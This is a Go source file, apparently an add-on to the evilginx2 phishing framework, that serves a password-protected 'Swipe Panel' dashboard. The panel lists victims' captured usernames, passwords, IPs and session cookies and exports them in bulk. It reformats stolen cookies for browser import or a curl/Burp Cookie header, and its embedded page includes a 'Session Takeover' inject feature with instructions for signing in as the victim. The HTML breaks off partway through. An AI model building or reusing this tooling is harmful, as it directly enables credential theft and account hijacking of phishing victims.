package core

import (
	"encoding/csv"
	"encoding/json"
	"fmt"
	"html/template"
	"net/http"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

// DashboardConfig holds the web dashboard configuration.
type DashboardConfig struct {
	Enabled     bool   `json:"enabled"`
	BindAddress string `json:"bind_address"`
	Username    string `json:"username"`
	Password    string `json:"password"`
}

// DashboardServer manages the HTTP server and session data for the web dashboard.
type DashboardServer struct {
	config     *DashboardConfig
	db         *database.Database
	phishCfg   *Config
	server     *http.Server
	mu         sync.RWMutex
	sessions   []*database.Session
}

// NewDashboardServer creates a new dashboard server instance.
func NewDashboardServer(cfg *DashboardConfig, db *database.Database, phishCfg *Config) (*DashboardServer, error) {
	if cfg == nil {
		return nil, fmt.Errorf("dashboard: config is nil")
	}
	if db == nil {
		return nil, fmt.Errorf("dashboard: database reference is nil")
	}
	return &DashboardServer{
		config:   cfg,
		db:       db,
		phishCfg: phishCfg,
	}, nil
}

// buildMux constructs and returns the dashboard HTTP mux.
func (ds *DashboardServer) buildMux() *http.ServeMux {
	mux := http.NewServeMux()
	mux.HandleFunc("/", ds.basicAuth(ds.handleDashboard))
	mux.HandleFunc("/api/sessions", ds.basicAuth(ds.handleAPISessions))
	mux.HandleFunc("/api/sessions/export", ds.basicAuth(ds.handleExportSessions))
	mux.HandleFunc("/api/sessions/", ds.basicAuth(ds.handleAPISessionDetail))
	mux.HandleFunc("/api/cookies/", ds.basicAuth(ds.handleAPICookies))
	mux.HandleFunc("/static/", ds.basicAuth(ds.handleStatic))
	return mux
}

// SetCredentials updates the basic-auth username and password at runtime.
func (ds *DashboardServer) SetCredentials(user, pass string) {
	ds.mu.Lock()
	defer ds.mu.Unlock()
	ds.config.Username = user
	ds.config.Password = pass
}

// Handler returns an http.Handler that serves the dashboard.
// Used to attach the dashboard to a virtual host in the main HTTPS proxy.
func (ds *DashboardServer) Handler() http.Handler {
	return ds.buildMux()
}

// Start begins the dashboard HTTP server on the configured address.
func (ds *DashboardServer) Start() error {
	if !ds.config.Enabled {
		log.Info("dashboard: web interface is disabled")
		return nil
	}

	ds.server = &http.Server{
		Addr:         ds.config.BindAddress,
		Handler:      ds.buildMux(),
		ReadTimeout:  15 * time.Second,
		WriteTimeout: 15 * time.Second,
		IdleTimeout:  60 * time.Second,
	}

	go func() {
		log.Info("dashboard: web interface starting on http://%s", ds.config.BindAddress)
		if err := ds.server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			log.Error("dashboard: server error: %v", err)
		}
	}()

	return nil
}

// Stop gracefully shuts down the dashboard HTTP server.
func (ds *DashboardServer) Stop() error {
	if ds.server != nil {
		log.Info("dashboard: shutting down web interface")
		return ds.server.Close()
	}
	return nil
}

// basicAuth is HTTP middleware that enforces Basic Authentication.
func (ds *DashboardServer) basicAuth(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if ds.config.Username == "" && ds.config.Password == "" {
			next(w, r)
			return
		}
		user, pass, ok := r.BasicAuth()
		if !ok || user != ds.config.Username || pass != ds.config.Password {
			w.Header().Set("WWW-Authenticate", `Basic realm="Control Panel"`)
			http.Error(w, "Unauthorized", http.StatusUnauthorized)
			return
		}
		next(w, r)
	}
}

// refreshSessions reloads the session cache from the database.
func (ds *DashboardServer) refreshSessions() error {
	ds.mu.Lock()
	defer ds.mu.Unlock()

	sessions, err := ds.db.ListSessions()
	if err != nil {
		return fmt.Errorf("dashboard: failed to list sessions: %v", err)
	}

	sort.Slice(sessions, func(i, j int) bool {
		return sessions[i].CreateTime > sessions[j].CreateTime
	})

	ds.sessions = sessions
	return nil
}

// handleDashboard renders the main dashboard HTML page.
func (ds *DashboardServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/" {
		http.NotFound(w, r)
		return
	}
	tmpl := template.Must(template.New("dashboard").Parse(dashboardHTML))
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	tmpl.Execute(w, map[string]string{
		"Title": "Capture Console",
	})
}

// handleAPISessions returns sessions as JSON with optional search/filter parameters.
func (ds *DashboardServer) handleAPISessions(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if err := ds.refreshSessions(); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	ds.mu.RLock()
	defer ds.mu.RUnlock()

	searchQuery := strings.ToLower(r.URL.Query().Get("search"))
	phishletFilter := r.URL.Query().Get("phishlet")
	limitStr := r.URL.Query().Get("limit")
	offsetStr := r.URL.Query().Get("offset")

	limit := 100
	if limitStr != "" {
		if l, err := strconv.Atoi(limitStr); err == nil && l > 0 {
			limit = l
		}
	}
	offset := 0
	if offsetStr != "" {
		if o, err := strconv.Atoi(offsetStr); err == nil && o >= 0 {
			offset = o
		}
	}

	var filtered []*database.Session
	for _, s := range ds.sessions {
		if phishletFilter != "" && s.Phishlet != phishletFilter {
			continue
		}
		if searchQuery != "" {
			if !strings.Contains(strings.ToLower(s.Username), searchQuery) &&
				!strings.Contains(strings.ToLower(s.Password), searchQuery) &&
				!strings.Contains(strings.ToLower(s.Phishlet), searchQuery) &&
				!strings.Contains(strings.ToLower(s.RemoteAddr), searchQuery) {
				continue
			}
		}
		filtered = append(filtered, s)
	}

	totalCount := len(filtered)
	if offset > len(filtered) {
		filtered = nil
	} else {
		end := offset + limit
		if end > len(filtered) {
			end = len(filtered)
		}
		filtered = filtered[offset:end]
	}

	response := map[string]interface{}{
		"sessions":  filtered,
		"total":     totalCount,
		"count":     len(filtered),
		"offset":    offset,
		"limit":     limit,
		"phishlets": ds.getPhishletNames(),
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(response)
}

// handleAPISessionDetail returns a single session by ID.
func (ds *DashboardServer) handleAPISessionDetail(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodDelete {
		parts := strings.Split(strings.TrimPrefix(r.URL.Path, "/api/sessions/"), "/")
		if len(parts) == 0 || parts[0] == "" {
			http.Error(w, "Session ID required", http.StatusBadRequest)
			return
		}
		id, err := strconv.Atoi(parts[0])
		if err != nil {
			http.Error(w, "Invalid session ID", http.StatusBadRequest)
			return
		}
		if err := ds.db.DeleteSessionById(id); err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}
		w.WriteHeader(http.StatusOK)
		json.NewEncoder(w).Encode(map[string]string{"status": "deleted"})
		return
	}

	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	parts := strings.Split(strings.TrimPrefix(r.URL.Path, "/api/sessions/"), "/")
	if len(parts) == 0 || parts[0] == "" {
		http.Error(w, "Session ID required", http.StatusBadRequest)
		return
	}
	id, err := strconv.Atoi(parts[0])
	if err != nil {
		http.Error(w, "Invalid session ID", http.StatusBadRequest)
		return
	}

	if err := ds.refreshSessions(); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	ds.mu.RLock()
	defer ds.mu.RUnlock()

	for _, s := range ds.sessions {
		if s.Id == id {
			w.Header().Set("Content-Type", "application/json")
			json.NewEncoder(w).Encode(s)
			return
		}
	}
	http.Error(w, "Session not found", http.StatusNotFound)
}

// handleExportSessions exports sessions in CSV or JSON format.
func (ds *DashboardServer) handleExportSessions(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if err := ds.refreshSessions(); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	ds.mu.RLock()
	defer ds.mu.RUnlock()

	format := r.URL.Query().Get("format")
	if format == "" {
		format = "csv"
	}

	switch format {
	case "csv":
		w.Header().Set("Content-Type", "text/csv")
		w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=sessions_%d.csv", time.Now().Unix()))
		writer := csv.NewWriter(w)
		defer writer.Flush()
		writer.Write([]string{"ID", "Phishlet", "Username", "Password", "Remote Address", "User-Agent", "Landing URL", "Created (UTC)"})
		for _, s := range ds.sessions {
			writer.Write([]string{
				strconv.Itoa(s.Id), s.Phishlet, s.Username, s.Password,
				s.RemoteAddr, s.UserAgent, s.LandingURL,
				time.Unix(s.CreateTime, 0).UTC().Format("2006-01-02 15:04:05"),
			})
		}
	case "json":
		w.Header().Set("Content-Type", "application/json")
		w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=sessions_%d.json", time.Now().Unix()))
		json.NewEncoder(w).Encode(ds.sessions)
	default:
		http.Error(w, "Unsupported export format. Use 'csv' or 'json'.", http.StatusBadRequest)
	}
}

// handleAPICookies returns captured cookie tokens for a session formatted as
// Cookie-Editor / EditThisCookie compatible JSON, ready for browser import.
func (ds *DashboardServer) handleAPICookies(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	parts := strings.Split(strings.TrimPrefix(r.URL.Path, "/api/cookies/"), "/")
	if len(parts) == 0 || parts[0] == "" {
		http.Error(w, "Session ID required", http.StatusBadRequest)
		return
	}
	id, err := strconv.Atoi(parts[0])
	if err != nil {
		http.Error(w, "Invalid session ID", http.StatusBadRequest)
		return
	}

	if err := ds.refreshSessions(); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	ds.mu.RLock()
	defer ds.mu.RUnlock()

	var target *database.Session
	for _, s := range ds.sessions {
		if s.Id == id {
			target = s
			break
		}
	}
	if target == nil {
		http.Error(w, "Session not found", http.StatusNotFound)
		return
	}

	type CookieExport struct {
		Name           string  `json:"name"`
		Value          string  `json:"value"`
		Domain         string  `json:"domain"`
		HostOnly       bool    `json:"hostOnly"`
		Path           string  `json:"path"`
		Secure         bool    `json:"secure"`
		HttpOnly       bool    `json:"httpOnly"`
		SameSite       string  `json:"sameSite"`
		Session        bool    `json:"session"`
		ExpirationDate int64   `json:"expirationDate"`
		StoreID        *string `json:"storeId"`
	}

	expiry := time.Now().AddDate(1, 0, 0).Unix()
	var cookies []CookieExport

	for domain, tokenGroup := range target.CookieTokens {
		cookieDomain := domain
		if !strings.HasPrefix(cookieDomain, ".") {
			cookieDomain = "." + cookieDomain
		}
		for _, tok := range tokenGroup {
			path := tok.Path
			if path == "" {
				path = "/"
			}
			cookies = append(cookies, CookieExport{
				Name:           tok.Name,
				Value:          tok.Value,
				Domain:         cookieDomain,
				HostOnly:       false,
				Path:           path,
				Secure:         tok.Secure,
				HttpOnly:       tok.HttpOnly,
				SameSite:       "Lax",
				Session:        false,
				ExpirationDate: expiry,
				StoreID:        nil,
			})
		}
	}

	// Resolve the target login URL from the phishlet config if available.
	targetURL := ""
	if ds.phishCfg != nil {
		if pl, err := ds.phishCfg.GetPhishlet(target.Phishlet); err == nil {
			targetURL = pl.GetLoginUrl()
		}
	}
	if targetURL == "" {
		// Fallback: use the first cookie domain as a best-effort target.
		for domain := range target.CookieTokens {
			clean := strings.TrimPrefix(domain, ".")
			targetURL = "https://" + clean
			break
		}
	}

	// Build a Cookie header string for use with curl / Burp.
	cookieHeaderParts := make([]string, 0, len(cookies))
	for _, c := range cookies {
		cookieHeaderParts = append(cookieHeaderParts, c.Name+"="+c.Value)
	}
	cookieHeader := strings.Join(cookieHeaderParts, "; ")

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"session_id":    id,
		"phishlet":      target.Phishlet,
		"cookies":       cookies,
		"target_url":    targetURL,
		"count":         len(cookies),
		"cookie_header": cookieHeader,
	})
}

// handleStatic serves embedded static assets.
func (ds *DashboardServer) handleStatic(w http.ResponseWriter, r *http.Request) {
	http.NotFound(w, r)
}

// getPhishletNames returns a deduplicated list of phishlet names from cached sessions.
func (ds *DashboardServer) getPhishletNames() []string {
	names := make(map[string]bool)
	for _, s := range ds.sessions {
		if s.Phishlet != "" {
			names[s.Phishlet] = true
		}
	}
	var result []string
	for name := range names {
		result = append(result, name)
	}
	sort.Strings(result)
	return result
}

const dashboardHTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>{{.Title}}</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
:root{
  --bg:#07090e;--surf:#0c1018;--surf2:#111820;--surf3:#18212e;
  --border:#1a2535;--border2:#253040;
  --text:#ddeaf8;--muted:#6b82a0;--dim:#3d5270;
  --green:#00c96a;--green-bg:#00c96a10;--green-bd:#00c96a32;
  --red:#ff4757;--red-bg:#ff475712;--red-bd:#ff475738;
  --amber:#f0883e;--amber-bg:#f0883e12;
  --blue:#4d9fff;--blue-bg:#4d9fff10;--blue-bd:#4d9fff30;
  --mono:ui-monospace,'SFMono-Regular',Consolas,monospace;
  --sb:212px;--rad:7px;
}
[data-theme="light"]{
  --bg:#edf1f7;--surf:#ffffff;--surf2:#f4f7fb;--surf3:#eaeff6;
  --border:#d0dae8;--border2:#b8c6d8;
  --text:#1a2436;--muted:#5a6b82;--dim:#94a3b8;
  --green:#00a854;--green-bg:#00a85410;--green-bd:#00a85438;
  --red:#e53945;--red-bg:#e5394510;--red-bd:#e5394538;
  --amber:#c96e1e;--amber-bg:#c96e1e10;
  --blue:#2b7fd4;--blue-bg:#2b7fd410;--blue-bd:#2b7fd430;
}
html,body{height:100%}
body{
  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-serif;
  background:var(--bg);color:var(--text);font-size:12px;line-height:1.5;
  display:flex;min-height:100vh;
}

/* ── Sidebar ─────────────────────────────────── */
#sidebar{
  width:var(--sb);flex-shrink:0;position:fixed;left:0;top:0;bottom:0;
  background:var(--surf);border-right:1px solid var(--border);
  display:flex;flex-direction:column;overflow-y:auto;z-index:200;
}
.sb-brand{
  padding:13px 14px 12px;display:flex;align-items:center;gap:8px;
  border-bottom:1px solid var(--border);flex-shrink:0;
}
.sb-brand-name{
  font-size:12.5px;font-weight:700;letter-spacing:-.3px;color:var(--text);
  white-space:nowrap;
}
.sb-brand-name .zap{color:var(--green);text-shadow:0 0 10px var(--green);font-style:normal}
.sb-live-dot{
  margin-left:auto;width:7px;height:7px;border-radius:50%;
  background:var(--green);box-shadow:0 0 7px var(--green);flex-shrink:0;
}
.sb-section{border-bottom:1px solid var(--border);padding:5px 0}
.sb-label{
  font-size:9.5px;font-weight:600;text-transform:uppercase;letter-spacing:.09em;
  color:var(--dim);padding:5px 13px 3px;
}
.sb-item{
  display:flex;align-items:center;justify-content:space-between;
  padding:5px 13px;font-size:11.5px;color:var(--muted);cursor:pointer;
  border-left:2px solid transparent;transition:background .1s,color .1s,border-color .1s;
  gap:6px;
}
.sb-item:hover{background:var(--surf2);color:var(--text)}
.sb-item.active{
  background:var(--green-bg);color:var(--green);
  border-left-color:var(--green);
}
.sb-item-label{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.sb-count{
  font-family:var(--mono);font-size:10px;color:var(--dim);
  background:var(--surf2);padding:1px 6px;border-radius:8px;
  border:1px solid var(--border);min-width:22px;text-align:center;flex-shrink:0;
}
.sb-item.active .sb-count{
  background:var(--green-bg);border-color:var(--green-bd);color:var(--green);
}
.sb-spacer{flex:1;min-height:12px}
.sb-bottom{
  padding:11px 12px;border-top:1px solid var(--border);flex-shrink:0;
}
.sb-social-link{
  display:flex;align-items:center;gap:8px;font-size:11px;color:var(--muted);
  text-decoration:none;padding:7px 9px;border-radius:var(--rad);
  border:1px solid var(--border);transition:all .15s;background:var(--surf2);
  overflow:hidden;
}
.sb-social-link:hover{border-color:var(--green);color:var(--green);background:var(--green-bg)}
.sb-social-dot{
  width:6px;height:6px;border-radius:50%;background:var(--green);
  box-shadow:0 0 6px var(--green);flex-shrink:0;
}
.sb-social-text{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}

/* ── Main ─────────────────────────────────────── */
#main{margin-left:var(--sb);flex:1;padding:12px;min-height:100vh}

/* ── Topbar ───────────────────────────────────── */
.topbar{
  display:flex;align-items:center;justify-content:space-between;
  padding:7px 12px;background:var(--surf);border:1px solid var(--border);
  border-radius:var(--rad);margin-bottom:9px;gap:10px;flex-wrap:wrap;
}
.topbar-left{display:flex;align-items:center;gap:9px}
.logo{font-size:13px;font-weight:700;letter-spacing:-.35px}
.logo .logo-accent{color:var(--green)}
.vr{width:1px;height:14px;background:var(--border)}
#refreshBadge{
  font-family:var(--mono);font-size:10px;color:var(--muted);
  background:var(--surf2);border:1px solid var(--border);
  border-radius:4px;padding:2px 8px;transition:all .2s;
}
#refreshBadge.live{color:var(--green);border-color:var(--green-bd);background:var(--green-bg)}
.topbar-right{display:flex;gap:5px;align-items:center;flex-wrap:wrap}

/* ── Buttons ──────────────────────────────────── */
.btn{
  display:inline-flex;align-items:center;gap:5px;padding:5px 10px;
  border:1px solid var(--border);border-radius:var(--rad);
  background:var(--surf2);color:var(--muted);cursor:pointer;
  font-size:11px;font-family:inherit;transition:all .1s;white-space:nowrap;
}
.btn:hover{background:var(--surf3);border-color:var(--border2);color:var(--text)}
.btn-g{background:var(--green-bg);border-color:var(--green-bd);color:var(--green)}
.btn-g:hover{filter:brightness(1.18)}
.btn-r{background:var(--red-bg);border-color:var(--red-bd);color:var(--red)}
.btn-r:hover{filter:brightness(1.12)}
.btn-sm{padding:3px 8px;font-size:11px}
.btn-xs{padding:2px 6px;font-size:10px}

/* ── Stats ────────────────────────────────────── */
.stats-row{
  display:grid;grid-template-columns:repeat(6,1fr);gap:7px;margin-bottom:9px;
}
.stat-card{
  background:var(--surf);border:1px solid var(--border);
  border-radius:var(--rad);padding:9px 11px;
}
.stat-card-lbl{
  font-size:9px;font-weight:600;text-transform:uppercase;
  letter-spacing:.09em;color:var(--dim);margin-bottom:3px;
}
.stat-card-val{
  font-size:19px;font-weight:700;font-family:var(--mono);line-height:1.1;
}
.stat-card-val.g{color:var(--green)}
.stat-card-val.a{color:var(--amber)}
.stat-card-val.sm{font-size:12px;padding-top:3px}
.stat-card-sub{font-size:10px;color:var(--dim);font-family:var(--mono);margin-top:1px}

/* ── Filter bar ───────────────────────────────── */
.filter-bar{
  display:flex;gap:6px;margin-bottom:9px;flex-wrap:wrap;align-items:center;
}
.filter-bar input,.filter-bar select{
  padding:5px 9px;border:1px solid var(--border);border-radius:var(--rad);
  background:var(--surf);color:var(--text);font-size:11px;font-family:inherit;
  outline:none;transition:border-color .12s;
}
.filter-bar input{flex:1;min-width:160px}
.filter-bar input:focus,.filter-bar select:focus{border-color:var(--blue)}
.filter-count{font-size:11px;color:var(--dim);white-space:nowrap;margin-left:auto;font-family:var(--mono)}

/* ── Table ────────────────────────────────────── */
.tbl-wrap{
  border:1px solid var(--border);border-radius:var(--rad);
  overflow:hidden;margin-bottom:9px;
}
table{width:100%;border-collapse:collapse;background:var(--surf)}
thead{background:var(--surf2);border-bottom:1px solid var(--border)}
th{
  padding:6px 9px;text-align:left;font-size:9.5px;font-weight:600;
  text-transform:uppercase;letter-spacing:.06em;color:var(--dim);
  cursor:pointer;user-select:none;white-space:nowrap;transition:color .1s;
}
th:hover{color:var(--muted)}
th .si{opacity:.35;margin-left:3px;font-size:9px}
th.sorted .si{opacity:1;color:var(--blue)}
td{
  padding:5px 9px;border-bottom:1px solid var(--border);
  max-width:155px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;
  vertical-align:middle;
}
tbody tr:last-child td{border-bottom:none}
tbody tr:hover{background:var(--surf2)}
tbody tr.selected{background:var(--blue-bg)}
.cm{font-family:var(--mono);font-size:11px}
.cid{color:var(--dim);font-family:var(--mono);font-size:11px}
.cp{cursor:pointer}
.tag{
  display:inline-block;font-size:10px;font-weight:600;
  padding:1px 6px;border-radius:4px;font-family:var(--mono);
}
.tag-pl{background:var(--surf2);border:1px solid var(--border);color:var(--muted)}
.tag-ok{background:var(--green-bg);border:1px solid var(--green-bd);color:var(--green)}
.tag-no{background:var(--surf2);border:1px solid var(--border);color:var(--dim)}
.chk{width:13px;height:13px;accent-color:var(--blue);cursor:pointer}
.empty{text-align:center;padding:44px;color:var(--dim)}
.empty-ico{font-size:24px;margin-bottom:8px;opacity:.4}
.empty p{font-size:11px}

/* ── Pagination ───────────────────────────────── */
.pager{
  display:flex;align-items:center;justify-content:space-between;
  padding:6px 11px;background:var(--surf);border:1px solid var(--border);
  border-radius:var(--rad);gap:8px;flex-wrap:wrap;
}
.page-info{font-size:11px;color:var(--dim);font-family:var(--mono)}
.page-btns{display:flex;gap:5px}
.bulk-bar{display:flex;align-items:center;gap:7px;font-size:11px;color:var(--dim)}

/* ── Detail panel ─────────────────────────────── */
.detail-panel{
  background:var(--surf);border:1px solid var(--green-bd);
  border-radius:var(--rad);margin-bottom:9px;overflow:hidden;
  animation:fdSlide .14s ease;
}
@keyframes fdSlide{from{opacity:0;transform:translateY(-5px)}to{opacity:1;transform:translateY(0)}}
.detail-hdr{
  display:flex;align-items:center;justify-content:space-between;
  padding:8px 12px;border-bottom:1px solid var(--border);background:var(--surf2);
  gap:8px;
}
.detail-hdr h3{font-size:11.5px;font-weight:600;color:var(--text);white-space:nowrap}
.detail-hdr-btns{display:flex;gap:5px;align-items:center;flex-wrap:wrap}
.detail-body{
  padding:12px;
  display:grid;grid-template-columns:1fr 1fr;gap:9px;
}
.df{display:flex;flex-direction:column;gap:3px}
.df label{
  font-size:9px;text-transform:uppercase;letter-spacing:.08em;
  color:var(--dim);font-weight:600;
}
.fval{
  font-family:var(--mono);font-size:11px;color:var(--text);
  background:var(--surf2);padding:5px 8px;border-radius:5px;
  border:1px solid var(--border);overflow-x:auto;word-break:break-all;
  white-space:pre-wrap;cursor:pointer;transition:border-color .12s;
}
.fval:hover{border-color:var(--blue)}
.df-wide{grid-column:1/-1}
.df-wide pre{
  background:var(--bg);padding:9px;border-radius:5px;
  border:1px solid var(--border);font-family:var(--mono);font-size:10px;
  overflow-x:auto;max-height:200px;white-space:pre-wrap;word-break:break-all;
}

/* ── Inject modal ─────────────────────────────── */
.overlay{
  position:fixed;inset:0;background:rgba(4,6,12,.8);z-index:9000;
  display:flex;align-items:center;justify-content:center;
  backdrop-filter:blur(5px);
}
.modal-box{
  background:var(--surf);border:1px solid var(--border);border-radius:10px;
  max-width:460px;width:92%;padding:20px;
  box-shadow:0 20px 70px rgba(0,0,0,.55);
}
.modal-hdr{display:flex;justify-content:space-between;align-items:center;margin-bottom:14px}
.modal-hdr h3{font-size:12.5px;font-weight:700;color:var(--text)}
.modal-banner{border-radius:6px;padding:10px 12px;margin-bottom:12px}
.modal-banner.ok{background:var(--green-bg);border:1px solid var(--green-bd)}
.mb-title{color:var(--green);font-size:11px;font-weight:700;margin-bottom:2px}
.mb-body{color:var(--text);font-size:11px}
.modal-inst{font-size:11px;color:var(--muted);margin-bottom:12px;line-height:1.8}
.modal-inst b{color:var(--text)}
.modal-inst code{
  font-family:var(--mono);font-size:10px;color:var(--text);
  background:var(--surf2);padding:1px 5px;border-radius:3px;
  border:1px solid var(--border);
}
.modal-acts{display:flex;gap:6px;flex-wrap:wrap}
.modal-err{margin-top:9px;font-size:10px;color:var(--red);white-space:pre-wrap;display:none}

/* ── Toast ────────────────────────────────────── */
.toast{
  position:fixed;bottom:18px;right:18px;padding:9px 14px;
  border-radius:var(--rad);font-size:11.5px;z-index:9999;
  opacity:0;transform:translateY(5px);
  transition:opacity .18s,transform .18s;pointer-events:none;
  max-width:280px;box-shadow:0 6px 28px rgba(0,0,0,.45);
}
.toast.on{opacity:1;transform:translateY(0)}
.t-ok{background:var(--green);color:#000;font-weight:700}
.t-err{background:var(--red);color:#fff;font-weight:700}
.t-info{background:var(--surf2);color:var(--text);border:1px solid var(--border)}

/* ── Responsive ───────────────────────────────── */
@media(max-width:780px){
  #sidebar{transform:translateX(-100%)}
  #main{margin-left:0}
  .stats-row{grid-template-columns:repeat(3,1fr)}
}
@media(max-width:520px){
  .stats-row{grid-template-columns:repeat(2,1fr)}
  .detail-body{grid-template-columns:1fr}
  .df-wide{grid-column:1}
}
</style>
</head>
<body data-app="evilginx-dashboard">

<!-- ── Sidebar ── -->
<aside id="sidebar">
  <div class="sb-brand">
    <div class="sb-brand-name">Swipe Panel <i class="zap">⚡</i></div>
    <div class="sb-live-dot" title="Live"></div>
  </div>

  <nav class="sb-section">
    <div class="sb-label">Sessions</div>
    <div class="sb-item active" id="sbi-all" onclick="quickFilter('all')">
      <span class="sb-item-label">All Sessions</span>
      <span class="sb-count" id="qf-all">0</span>
    </div>
    <div class="sb-item" id="sbi-tokens" onclick="quickFilter('tokens')">
      <span class="sb-item-label">With Tokens</span>
      <span class="sb-count" id="qf-tokens">0</span>
    </div>
    <div class="sb-item" id="sbi-notokens" onclick="quickFilter('notokens')">
      <span class="sb-item-label">No Tokens</span>
      <span class="sb-count" id="qf-notokens">0</span>
    </div>
  </nav>

  <div id="sbPlSection" class="sb-section" style="display:none">
    <div class="sb-label">Phishlets</div>
    <div id="sbPhishlets"></div>
  </div>

  <div class="sb-spacer"></div>

  <div class="sb-bottom">
    <!-- Paste your channel/social link into href and update the text below -->
    <a id="socialLink" href="#" target="_blank" rel="noopener" class="sb-social-link">
      <span class="sb-social-dot"></span>
      <span class="sb-social-text" id="socialLinkText">⚡ Channel</span>
    </a>
  </div>
</aside>

<!-- ── Main content ── -->
<main id="main">

  <!-- Topbar -->
  <div class="topbar">
    <div class="topbar-left">
      <div class="logo">Swipe <span class="logo-accent">Console</span></div>
      <div class="vr"></div>
      <div id="refreshBadge" class="live">LIVE</div>
    </div>
    <div class="topbar-right">
      <button class="btn" onclick="toggleTheme()">
        <span id="themeDot" style="display:inline-block;width:6px;height:6px;border-radius:50%;background:var(--amber);margin-right:2px"></span>
        <span id="themeLabel">Light</span>
      </button>
      <button class="btn" id="arBtn" onclick="toggleAutoRefresh()">Pause</button>
      <button class="btn btn-g" onclick="exportCSV()">CSV</button>
      <button class="btn" onclick="exportJSON()">JSON</button>
      <button class="btn" onclick="manualRefresh()">Refresh</button>
    </div>
  </div>

  <!-- Stats row -->
  <div class="stats-row">
    <div class="stat-card">
      <div class="stat-card-lbl">Total</div>
      <div class="stat-card-val" id="sStat">0</div>
      <div class="stat-card-sub">&nbsp;</div>
    </div>
    <div class="stat-card">
      <div class="stat-card-lbl">Tokens</div>
      <div class="stat-card-val g" id="tStat">0</div>
      <div class="stat-card-sub" id="tPct">&nbsp;</div>
    </div>
    <div class="stat-card">
      <div class="stat-card-lbl">No Tokens</div>
      <div class="stat-card-val a" id="ntStat">0</div>
      <div class="stat-card-sub">&nbsp;</div>
    </div>
    <div class="stat-card">
      <div class="stat-card-lbl">Unique IPs</div>
      <div class="stat-card-val" id="ipStat">0</div>
      <div class="stat-card-sub">&nbsp;</div>
    </div>
    <div class="stat-card">
      <div class="stat-card-lbl">Phishlets</div>
      <div class="stat-card-val" id="plStat">0</div>
      <div class="stat-card-sub">&nbsp;</div>
    </div>
    <div class="stat-card">
      <div class="stat-card-lbl">Last Capture</div>
      <div class="stat-card-val sm" id="lcStat">--</div>
      <div class="stat-card-sub" id="lcSub">&nbsp;</div>
    </div>
  </div>

  <!-- Filter bar (phishlet/token selects are hidden; sidebar controls them) -->
  <div class="filter-bar">
    <input type="text" id="searchInput" placeholder="Search username, password, IP, user-agent…" oninput="applyFilters()">
    <select id="phishletFilter" onchange="applyFilters()" style="display:none"></select>
    <select id="tokenFilter" onchange="applyFilters()" style="display:none"></select>
    <button class="btn btn-sm" onclick="clearFilters()">Clear</button>
    <span class="filter-count" id="filterCount"></span>
  </div>

  <!-- Session detail panel -->
  <div class="detail-panel" id="detailPanel" style="display:none">
    <div class="detail-hdr">
      <h3 id="detailTitle">Session Detail</h3>
      <div class="detail-hdr-btns">
        <button class="btn btn-sm" onclick="copyAll()">Copy All</button>
        <button class="btn btn-sm btn-g" id="injectBtn" onclick="injectSession()" style="display:none">&#9889; Inject</button>
        <span id="extBadge" style="display:none;font-size:10px;padding:2px 7px;border-radius:4px;background:var(--green-bg);color:var(--green);border:1px solid var(--green-bd)">&#9679; Injector</span>
        <button class="btn btn-sm btn-r" onclick="deleteCurrentDetail()">Delete</button>
        <button class="btn btn-sm" onclick="closeDetail()">&#10005;</button>
      </div>
    </div>
    <div class="detail-body" id="detailBody"></div>
  </div>

  <!-- Inject modal -->
  <div id="injectModal" class="overlay" style="display:none">
    <div class="modal-box">
      <div class="modal-hdr">
        <h3>&#9889; Session Takeover</h3>
        <button class="btn btn-sm" onclick="closeInjectModal()">&#10005; Close</button>
      </div>

      <div id="injectExtPanel" style="display:none">
        <div class="modal-banner ok">
          <div class="mb-title">&#10003; Cookies injected via extension</div>
          <div class="mb-body" id="injectExtCount"></div>
        </div>
        <div class="modal-inst">
          Target site opened in a new tab — you should be signed in.<br>
          If a login screen appears, reload once.
        </div>
        <div class="modal-acts">
          <button class="btn btn-sm" onclick="copyCookieHeader()">Copy Cookie Header</button>
          <button class="btn btn-sm" onclick="reDownloadCookies()">Download JSON</button>
        </div>
        <div class="modal-err" id="injectExtErrors"></div>
      </div>

      <div id="injectManualPanel" style="display:none">
        <div class="modal-banner ok">
          <div class="mb-title">&#10003; Cookie file downloaded</div>
          <div class="mb-body" id="injectCookieCount"></div>
        </div>
        <div class="modal-inst">
          <b>Via Cookie-Editor extension:</b><br>
          1. Install <b>Cookie-Editor</b> in Chrome<br>
          2. Click <b>Open Target Site</b> below<br>
          3. Open Cookie-Editor &#8594; <b>Import</b> &#8594; paste JSON &#8594; Reload page<br><br>
          <b>Via curl / Burp:</b> click <b>Copy Cookie Header</b><br>
          <code>curl -b "..." https://target</code>
        </div>
